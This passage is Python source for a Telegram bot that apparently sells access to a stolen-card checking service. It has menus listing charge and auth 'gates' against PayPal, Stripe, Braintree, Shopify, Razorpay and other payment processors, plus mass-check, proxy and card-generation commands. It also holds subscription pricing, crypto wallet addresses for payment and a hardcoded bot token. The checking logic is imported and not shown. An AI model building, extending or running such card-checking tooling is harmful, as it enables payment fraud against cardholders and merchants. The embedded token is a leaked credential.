            [InlineKeyboardButton("Back", callback_data="charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    elif data == "charge_paypal":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Paypal 1$</i>  
<b><i>Command ↬</i></b> <i>/pp</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Paypal 0.10$</i>  
<b><i>Command ↬</i></b> <i>/p1</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Paypal 5$ CVV</i>  
<b><i>Command ↬</i></b> <i>/pv</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    elif data == "charge_payu":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>PayU 0.29$</i>  
<b><i>Command ↬</i></b> <i>/py</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>PayU 1€</i>  
<b><i>Command ↬</i></b> <i>/pu</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    elif data == "charge_razorpay":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Razorpay 1₹</i>  
<b><i>Command ↬</i></b> <i>/rz</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    elif data == "charge_shopify":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Shopify 0.98$</i>  
<b><i>Command ↬</i></b> <i>/sh</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    elif data == "charge_payfast":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>PayFast 0.30$</i>  
<b><i>Command ↬</i></b> <i>/pf</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # AUTH MENU
    elif data == "auth_menu":
        # All gates are now shown as online without checking status
        text = f"""
<b><i>Gate ↬</i></b> <i>Braintree Auth</i>  
<b><i>Command ↬</i></b> <i>/chk</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Stripe Auth</i>  
<b><i>Command ↬</i></b> <i>/au</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>3DS Lookup</i>  
<b><i>Command ↬</i></b> <i>/vbv</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="menu_gates")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # PRICING MENU WITH PROPER FORMATTING
    elif data == "menu_pricing":
        text = """
<b>⚡ Available Access Plans</b>
━━━━━━━━━━━━━━━━━━
<pre>𝑪𝒐𝒓𝒆 𝑨𝒄𝒄𝒆𝒔🛠️</pre>
<b>Duration ↬</b> <i>7 days</i>
<b>Price ↬</b> <i>5$</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑬𝒍𝒊𝒕𝒆 𝑨𝒄𝒄𝒆𝒔⭐</pre>
<b>Duration ↬</b> <i>15 days</i>
<b>Price ↬</b> <i>10$</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑹𝒐𝒐𝒕 𝑨𝒄𝒄𝒆𝒔👑</pre>
<b>Duration ↬</b> <i>30 days</i>
<b>Price ↬</b> <i>20$</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
<pre>𝑿-𝑨𝒄𝒄𝒆𝒔👑</pre>
<b>Duration ↬</b> <i>90 days</i>
<b>Price ↬</b> <i>35$</i>
<b>Credits ↬</b> <i>Unlimited until plan ends</i>
━━━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Buy Now", callback_data="buy_now")],
            [InlineKeyboardButton("Back", callback_data="back_main")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # BUY NOW MENU
    elif data == "buy_now":
        text = """
<b>💳 Payment Options</b>
━━━━━━━━━━━━━━━━━━
<b>USDT (BEP20)</b>
<code>0x74d12ad119d5b5411936f4832b8d6ee48f51af4c</code>
━━━━━━━━━━━━━━━━━━
<b>USDT (TRC20)</b>
<code>TDtFPZMJepebQ12S1y32Dmt1Bcvw1X43oM</code>
━━━━━━━━━━━━━━━━━━
<b>BITCOIN (BTC)</b>
<code>bc1q8jw5dklz74gr3wehf4pcq6kp8dzqsxcst2mshe</code>
━━━━━━━━━━━━━━━━━━
<b>SOLANA (SQL)</b>
<code>BHuPMs6d6J8PJMM1BfBH8oJfaDARTnm6Ata76oAiiuC3</code>
━━━━━━━━━━━━━━━━━━
<b>BINANCE ID</b>
<code>1123562092</code>
━━━━━━━━━━━━━━━━━━
<b>⚠️ After payment, contact admin</b>
<a href="https://t.me/rev3rsex">@rev3rsex</a>
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="menu_pricing")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # BACK TO MAIN PROFILE
    elif data == "back_main":
        # Get user info from the callback query instead of fetching from DB again
        user = update.effective_user
        user_id = user.id
        username = user.username if user.username else ""
        first_name = html.escape(user.first_name or "User")
        
        # Get the existing message to extract the user data from it
        message_text = query.message.caption or query.message.text or ""
        
        # Extract user data from the message if available
        # This is more efficient than querying the database again
        try:
            # Try to extract user data from the current message
            
            # Extract user ID
            user_id_match = re.search(r'<code>(\d+)</code>', message_text)
            if user_id_match:
                user_id = user_id_match.group(1)
            
            # Extract username
            username_match = re.search(r'@([^<\s]+)', message_text)
            if username_match:
                username = username_match.group(1)
            
            # Extract tier
            tier_match = re.search(r'\[([^\]]+)\]', message_text)
            if tier_match:
                db_tier = tier_match.group(1)
            else:
                db_tier = "Free"
            
            # Extract credits
            credits_match = re.search(r'<code>([^<]+)</code>', message_text.split("𝐂𝐫𝐞𝐝𝐢𝐭𝐬")[1].split("𝐉𝒐𝒏𝒆𝒅")[0] if "𝐂𝐫𝐞𝐝𝐢𝐭𝐬" in message_text else "")
            if credits_match:
                credits_display = credits_match.group(1)
            else:
                # If we can't extract credits, get them from the database
                loop = asyncio.get_running_loop()
                db_user_data = await loop.run_in_executor(executor, get_or_create_user, user_id, username)
                if db_user_data:
                    _, _, _, db_credits = db_user_data
                    current_credits = get_user_credits(user_id)
                    if current_credits == float('inf'):
                        credits_display = "Infinite😎"
                    else:
                        credits_display = str(db_credits)
                else:
                    credits_display = "0"
            
            # Extract joined date
            joined_match = re.search(r'<code>([^<]+)</code>', message_text.split("𝐉𝒐𝒏𝒆𝒅")[1].split("𝐃𝐞𝐯")[0] if "𝐉𝒐𝒏𝒆𝒅" in message_text else "")
            if joined_match:
                formatted_joined_date = joined_match.group(1)
            else:
                # Default to today's date if we can't extract it
                formatted_joined_date = format_indian_datetime(datetime.datetime.now())
                
        except Exception as e:
            # If extraction fails, fetch from database
            try:
                loop = asyncio.get_running_loop()
                db_user_data = await loop.run_in_executor(executor, get_or_create_user, user_id, username)
                
                if not db_user_data:
                    error_msg = """
<a href='https://t.me/rev3rsex'>⚠️</a> <b>Database Connection Failed</b>
<pre>⊀ Error: Unable to connect to database</pre>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Action Required:</b> Please contact support
<a href='https://t.me/rev3rsex'>⌬</a> <b>Support:</b> <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
                    await safe_edit_message(
                        context=context,
                        chat_id=chat_id,
                        message_id=message_id,
                        text=error_msg,
                        parse_mode=ParseMode.HTML
                    )
                    return
                
                db_username, db_joined_date, db_tier, db_credits = db_user_data
                
                # Get real-time credits to check for unlimited
                current_credits = get_user_credits(user_id)
                if current_credits == float('inf'):
                    credits_display = "Infinite😎"
                else:
                    credits_display = str(db_credits)
                
                # Format datetime properly to ensure correct timezone display
                formatted_joined_date = format_indian_datetime(db_joined_date)
                
                # Display username properly - add @ if username exists, otherwise show "None"
                display_username = f"@{db_username}" if db_username else "None"
            except Exception as db_error:
                logging.error(f"Database error in back_main: {db_error}")
                # Use default values if database fails
                db_tier = "Free"
                credits_display = "0"
                formatted_joined_date = format_indian_datetime(datetime.datetime.now())
                display_username = f"@{username}" if username else "None"
        else:
            # If extraction was successful, use the extracted values
            display_username = f"@{username}" if username else "None"

        # ==============================
        # PROFILE CARD DESIGN
        # ==============================
        caption = f"""
<pre>⊀ 𝑺𝒕𝒂𝒕𝒖𝒔: 𝐀𝐜𝐭𝐢𝐯𝐞 ✅</pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐈𝐃</b> ↬ <code>{user_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {display_username}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐌𝒂𝒏𝒈</b> ↬ <a href='tg://user?id={user_id}'>{first_name}</a> <code>[{html.escape(str(db_tier))}]</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝒓𝒆𝒅𝒊𝒕𝒔</b> ↬ <code>{credits_display}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐉𝒐𝒏𝒆𝒅</b> ↬ <code>{formatted_joined_date}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""

        # Edit the current message instead of sending a new one
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=caption.strip(), parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("Gates", callback_data="menu_gates"), InlineKeyboardButton("Pricing", callback_data="menu_pricing")],
                        [InlineKeyboardButton("Group", url="https://t.me/stripenigga"), InlineKeyboardButton("Updates", url="https://t.me/stripenigga")],
                        [InlineKeyboardButton("Dev", url="https://t.me/rev3rsex"), InlineKeyboardButton("Support", url="https://t.me/rev3rsex")]
                    ])
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=caption.strip(),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("Gates", callback_data="menu_gates"), InlineKeyboardButton("Pricing", callback_data="menu_pricing")],
                        [InlineKeyboardButton("Group", url="https://t.me/stripenigga"), InlineKeyboardButton("Updates", url="https://t.me/stripenigga")],
                        [InlineKeyboardButton("Dev", url="https://t.me/rev3rsex"), InlineKeyboardButton("Support", url="https://t.me/rev3rsex")]
                    ])
                )
        except Exception as e:
            error_msg = f"""
<a href='https://t.me/rev3rsex'>⚠️</a> <b>System Error</b>
<pre>⊀ Error: {str(e)}</pre>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Action Required:</b> Please try again later
<a href='https://t.me/rev3rsex'>⌬</a> <b>Support:</b> <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
            logging.error(f"Error updating profile: {e}")
            await safe_edit_message(
                context=context,
                chat_id=chat_id,
                message_id=message_id,
                text=error_msg,
                parse_mode=ParseMode.HTML
            )
# ==============================
# MAIN BOT LAUNCHER
# ==============================
def main():
    # Create a thread pool executor to use with run_in_executor
    global executor
    executor = ThreadPoolExecutor(max_workers=4)
    
    if not create_connection_pool():
        error_msg = """
<a href='https://t.me/rev3rsex'>⚠️</a> <b>Database Connection Failed</b>
<pre>⊀ Error: Unable to establish database connection pool</pre>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Action Required:</b> Please check database configuration
<a href='https://t.me/rev3rsex'>⌬</a> <b>Support:</b> <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
        logging.error("❌ Failed to connect DB.")
        print(error_msg)
        return
    setup_database()

    TOKEN = "8705971644:AAH3DCTgpHi0C8nFWp5hDE9UDL3nLGNcJoE"
    app = Application.builder().token(TOKEN).build()
    
    app.post_init = on_startup
    app.post_shutdown = on_shutdown
    # ==============================
    # IMPORT MASS CHECK HANDLERS
    # ==============================
# ==============================
    # CORE COMMAND HANDLERS
    # ==============================
    app.add_handler(CommandHandler("start", start))
   
    # NOTE: The generic handle_buttons is moved to VERY END to avoid conflicts.
    # This is most critical change.
    
    # Apply force_join decorator to all command handlers except /start
    @force_join
    async def wrapped_rz_command(update, context):
        return await handle_rz_command(update, context)
    
    @force_join
    async def wrapped_sh_command(update, context):
        return await handle_sh_command(update, context)
    
    @force_join
    async def wrapped_chk_command(update, context):
        return await handle_chk_command(update, context)
    
    @force_join
    async def wrapped_at_command(update, context):
        return await handle_at_command(update, context)

    
    @force_join
    async def wrapped_gate_command(update, context):
        return await handle_gate_command(update, context)

    
    @force_join
    async def wrapped_msh_command(update, context):
        return await handle_msh_command(update, context)
    
    @force_join
    async def wrapped_vbv_command(update, context):
        return await handle_vbv_command(update, context)
    
    @force_join
    async def wrapped_pv_command(update, context):
        return await handle_pv_command(update, context)
    
    @force_join
    async def wrapped_gplan1_command(update, context):
        return await handle_gplan1(update, context)
        
    @force_join
    async def wrapped_status_command(update, context):
        return await status_command(update, context)
    
    @force_join
    async def wrapped_gplan2_command(update, context):
        return await handle_gplan2(update, context)
    
    @force_join
    async def wrapped_gplan3_command(update, context):
        return await handle_gplan3(update, context)
    
    @force_join
    async def wrapped_gplan4_command(update, context):
        return await handle_gplan4(update, context)
    
    @force_join
    async def wrapped_claim_command(update, context):
        return await handle_claim(update, context)
    
    @force_join
    async def wrapped_gcodes_command(update, context):
        return await handle_gcodes(update, context)
    
    @force_join
    async def wrapped_st_command(update, context):
        return await handle_st_command(update, context)
    
    
    @force_join
    async def wrapped_pp_command(update, context):
        return await handle_pp_command(update, context)
    
    @force_join
    async def wrapped_p1_command(update, context):
        return await handle_p1_command(update, context)
    
    
    @force_join
    async def wrapped_credits_command(update, context):
        return await handle_credits_command(update, context)
    
    @force_join
    async def wrapped_gen_command(update, context):
        return await handle_gen_command(update, context)
    
    @force_join
    async def wrapped_proxy_command(update, context):
        return await handle_proxy_command(update, context)
    
    @force_join
    async def wrapped_rproxy_command(update, context):
        return await handle_rproxy_command(update, context)
    
    @force_join
    async def wrapped_myproxy_command(update, context):
        return await handle_myproxy_command(update, context)
    
    @force_join
    async def wrapped_b3_command(update, context):
        return await handle_b3_command(update, context)   
        
    @force_join
    async def wrapped_scr_command(update, context):
        return await handle_scr_command(update, context)

    @force_join
    async def wrapped_pf_command(update, context):
        return await handle_pf_command(update, context)

    @force_join
    async def wrapped_py_command(update, context):
        return await handle_py_command(update, context)

    @force_join
    async def wrapped_au_command(update, context):
        return await handle_au_command(update, context)

    @force_join
    async def wrapped_rzpv2_command(update, context):
        return await handle_rzpv2_command(update, context)

    @force_join
    async def wrapped_ast_command(update, context):
        return await handle_ast_command(update, context)

    @force_join
    async def wrapped_xsh_command(update, context):
        return await handle_xsh_command(update, context)

    @force_join
    async def wrapped_mau_command(update, context):
        # Use imported handle_mau_command from mau.py
        return await handle_mau_command(update, context)
    
    # Register wrapped command handlers
    app.add_handler(CommandHandler("pv", wrapped_pv_command))
    app.add_handler(CommandHandler("mau", wrapped_mau_command))
    app.add_handler(CommandHandler("au", wrapped_au_command))
    app.add_handler(CommandHandler("py", wrapped_py_command))
    app.add_handler(CommandHandler("pf", wrapped_pf_command))
    app.add_handler(CommandHandler("rzpv2", wrapped_rzpv2_command))
    app.add_handler(CommandHandler("ast", wrapped_ast_command))
    app.add_handler(CommandHandler("xsh", wrapped_xsh_command))
    app.add_handler(CommandHandler("scr", wrapped_scr_command))
    app.add_handler(CommandHandler("rz", wrapped_rz_command))
    app.add_handler(CommandHandler("sh", wrapped_sh_command))
    app.add_handler(CommandHandler("chk", wrapped_chk_command))
    app.add_handler(CommandHandler("b3", wrapped_b3_command))
    app.add_handler(CommandHandler("gate", wrapped_gate_command))
    app.add_handler(CommandHandler("msh", wrapped_msh_command))
    app.add_handler(CommandHandler("vbv", wrapped_vbv_command))
    app.add_handler(CommandHandler("broad", broad))
    app.add_handler(CommandHandler("gplan1", wrapped_gplan1_command))
    app.add_handler(CommandHandler("gplan2", wrapped_gplan2_command))
    app.add_handler(CommandHandler("gplan3", wrapped_gplan3_command))
    app.add_handler(CommandHandler("gplan4", wrapped_gplan4_command))
    app.add_handler(CommandHandler("claim", wrapped_claim_command))
    app.add_handler(CommandHandler("gcodes", wrapped_gcodes_command))
    app.add_handler(CommandHandler("st", wrapped_st_command))
    app.add_handler(CommandHandler("pp", wrapped_pp_command))
    app.add_handler(CommandHandler("p1", wrapped_p1_command))
    app.add_handler(CommandHandler("credits", wrapped_credits_command))
    app.add_handler(CommandHandler("gen", wrapped_gen_command))
    app.add_handler(CommandHandler("proxy", wrapped_proxy_command))
    app.add_handler(CommandHandler("rproxy", wrapped_rproxy_command))
    app.add_handler(CommandHandler("myproxy", wrapped_myproxy_command))
    app.add_handler(CommandHandler("status", wrapped_status_command))

    # Import and register the stop command handler
    app.add_handler(CommandHandler("stop", handle_stop_command))
    # ==============================
    # PLAN COMMAND HANDLERS
    # ==============================

    @force_join
    async def wrapped_decreds_command(update, context):
        return await handle_decreds(update, context)

    @force_join
    async def wrapped_plan1_command(update, context):
        return await handle_plan1(update, context)
        
    @force_join
    async def wrapped_planall_command(update, context):
        return await handle_planall(update, context)
    
    
    @force_join
    async def wrapped_plan2_command(update, context):
        return await handle_plan2(update, context)
    
    @force_join
    async def wrapped_plan3_command(update, context):
        return await handle_plan3(update, context)
    
    @force_join
    async def wrapped_plan4_command(update, context):
        return await handle_plan4(update, context)
    
    @force_join
    async def wrapped_rplan_command(update, context):
        return await handle_rplan(update, context)
        
    app.add_handler(CommandHandler("plan1", wrapped_plan1_command))
    app.add_handler(CommandHandler("plan2", wrapped_plan2_command))
    app.add_handler(CommandHandler("plan3", wrapped_plan3_command))
    app.add_handler(CommandHandler("plan4", wrapped_plan4_command))
    app.add_handler(CommandHandler("rplan", wrapped_rplan_command))
    app.add_handler(CommandHandler("planall", wrapped_planall_command))
    app.add_handler(CommandHandler("decreds", wrapped_decreds_command))

    # ==============================
    # COMMANDS MENU HANDLER (/cmds) - CORRECTED
    # ==============================
    # CHANGE 1: Import new, combined handler
    
    @force_join
    async def wrapped_cmds_command(update, context):
        return await cmds_command(update, context)
    
    # Register command handler - THIS WAS MISSING
    app.add_handler(CommandHandler("cmds", wrapped_cmds_command))
        
# ==============================
    # SETURL COMMAND HANDLERS
    # ==============================
    # Import all handler functions from seturl.py

    @force_join
    async def wrapped_seturl_command(update, context):
        # Use imported handle_seturl_command from seturl.py
        return await handle_seturl_command(update, context)

    @force_join
    async def wrapped_delurl_command(update, context):
        # Use imported handle_delurl_command from seturl.py
        return await handle_delurl_command(update, context)

    @force_join
    async def wrapped_delall_command(update, context):
        # Use imported handle_delall_command from seturl.py
        return await handle_delall_command(update, context)

    @force_join
    async def wrapped_resites_command(update, context):
        # Use imported handle_resites_command from seturl.py
        return await handle_resites_command(update, context)


    # Register all seturl command handlers
    app.add_handler(CommandHandler("seturl", wrapped_seturl_command))
    app.add_handler(CommandHandler("delurl", wrapped_delurl_command))
    app.add_handler(CommandHandler("delall", wrapped_delall_command))
    app.add_handler(CommandHandler("resites", wrapped_resites_command))
    # Register delall callback handler
    app.add_handler(CallbackQueryHandler(handle_delall_callback, pattern=r'^delall_'))
    app.add_handler(CallbackQueryHandler(handle_seturl_price_callback, pattern=r'^seturl_price_'))
    app.add_handler(CallbackQueryHandler(handle_msh_confirm_callback, pattern=r'^msh_(yes|no)_'))


    # ==============================
    # SEPARATE STOP CALLBACK HANDLERS FOR EACH MODULE
    # ==============================
    # MAU Stop Callback Handler
    async def mau_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        data = query.data
        user_id = update.effective_user.id
        
        # Acknowledge button press
        await safe_answer_callback_query(query)
        
        # Check if the user who clicked is the same as the one who started the check
        if not data.startswith("stop_mau_"):
            return
            
        try:
            # Get the user ID from callback data
            callback_user_id = int(data.split("_")[-1])
            
            # Get the current user ID from query
            current_user_id = update.effective_user.id
            
            # Check if the user who clicked is the same as the one who started the check
            if callback_user_id != current_user_id:
                # Show popup message "Not your business"
                await context.bot.answer_callback_query(
                    query.id,
                    text="⛔ Not your business!",
                    show_alert=True
                )
                return
            
            # Check if there's an active mass check for this user
            if callback_user_id not in mau_active_mass_checks:
                await context.bot.answer_callback_query(
                    query.id,
                    text="⚠️ No active MAU check found!",
                    show_alert=True
                )
                return
            
            # Set stop flag for this user
            mau_active_mass_checks[callback_user_id]["stopped"] = True
            
            # Set the stop_event if it exists
            if "stop_event" in mau_active_mass_checks[callback_user_id]:
                mau_active_mass_checks[callback_user_id]["stop_event"].set()
                logging.info(f"Stop event set for MAU user {callback_user_id}")
            
            logging.info(f"Stop requested by user {callback_user_id} for MAU")
            
            # Cancel all active API calls if they exist
            if "workers" in mau_active_mass_checks[callback_user_id]:
                workers = mau_active_mass_checks[callback_user_id]["workers"]
                if workers:
                    logging.info(f"Cancelling {len(workers)} active workers for MAU user {callback_user_id}")
                    
                    # Cancel all tasks
                    for task in workers:
                        try:
                            if not task.done():
                                task.cancel()
                        except Exception as e:
                            logging.error(f"Error cancelling MAU task: {str(e)}")
                    
                    # Wait for all tasks to be cancelled with a timeout
                    try:
                        await asyncio.wait_for(
                            asyncio.gather(*workers, return_exceptions=True),
                            timeout=5.0
                        )
                    except asyncio.TimeoutError:
                        logging.warning(f"Timeout waiting for MAU tasks to cancel for user {callback_user_id}")
            
            # Show popup message "Stopped checking"
            await context.bot.answer_callback_query(
                query.id,
                text="⏹️ Stopped MAU checking!",
                show_alert=True
            )
            
            # Calculate elapsed time
            start_time = mau_active_mass_checks[callback_user_id].get("start_time", time.time())
            elapsed_time = round(abs(time.time() - start_time), 2)
            
            # Get user name
            user_name = update.effective_user.first_name
            
            # Get stats from active_checks
            stats = mau_active_mass_checks[callback_user_id].get("stats", {
                "total": 0,
                "checked": 0,
                "approved": 0,
                "declined": 0,
                "error": 0
            })
            
            # Import format_final_response function
            
            # Update message to show final results immediately without stop button
            await safe_edit_message(
                context=context,
                chat_id=query.message.chat_id,
                message_id=query.message.message_id,
                text=format_final_response(stats, elapsed_time, user_name, True),
                parse_mode="HTML"
            )
            
            # Clean up the user entry immediately after stopping
            if callback_user_id in mau_active_mass_checks:
                del mau_active_mass_checks[callback_user_id]
            
        except (ValueError, IndexError) as e:
            logging.error(f"Error processing MAU stop callback: {str(e)}")
            pass  # Invalid callback data
            
    # Add this after your stop callback handlers
    app.add_handler(CallbackQueryHandler(cmds_callback_handler, pattern=r'^cmds_'))
    # Register separate stop callback handlers with highest priority
    app.add_handler(CallbackQueryHandler(mau_stop_callback, pattern=r'^stop_mau_'), group=0)
    # ==============================
    # FORCE JOIN CALLBACK HANDLER
    # ==============================
    app.add_handler(CallbackQueryHandler(check_joined_callback, pattern="check_joined"))
    # ==============================
    # GENERIC CALLBACK HANDLER - MOVED TO THE END
    # ==============================
    # CHANGE 3: Moved this generic handler to very bottom.
    # It will now only catch callbacks that were not handled by more specific handlers above.
    app.add_handler(CallbackQueryHandler(handle_buttons))

    # ==============================
    # START BOT
    # ==============================
    logging.info("🚀 @rev3rsex Bot Started Successfully")

    try:
        app.run_polling()
    finally:
        # Clean up resources
        executor.shutdown(wait=True)
        close_connection_pool()
        logging.info("🔒 Database connections closed.")

if __name__ == "__main__":
    main()

